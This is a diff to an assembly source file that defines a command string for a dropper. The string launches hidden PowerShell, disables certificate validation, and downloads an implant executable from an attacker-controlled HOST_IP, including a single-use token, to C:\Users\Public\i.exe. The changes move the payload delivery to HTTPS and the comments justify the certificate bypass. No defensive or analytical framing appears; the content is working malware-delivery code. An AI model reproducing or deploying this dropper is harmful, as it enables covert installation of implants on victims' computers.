@@ -108,10 +108,17 @@ _start:
 ;
 ;  0x22 = "   0x27 = '   0x00 = null terminator
 ;  No null bytes within the string — only the final 0x00 terminates it.
+; Section 9: HTTPS delivery with single-use token + self-signed cert bypass.
+; [Net.ServicePointManager]::ServerCertificateValidationCallback={$true} bypasses
+; certificate validation for the self-signed nginx cert (self-signed because we
+; have no registered domain).  The bypass is intentional and scoped to this
+; PowerShell process only.
 cmd:
     db 'powershell -w h -nop -c ', 0x22
+    db '[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
+    db '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;'
     db '(New-Object Net.WebClient).DownloadFile('
-    db 0x27, 'http://HOST_IP:8000/implant.exe', 0x27
+    db 0x27, 'https://HOST_IP/update/DOWNLOAD_TOKEN', 0x27
     db ','
     db 0x27, 'C:\Users\Public\i.exe', 0x27
     db ');'
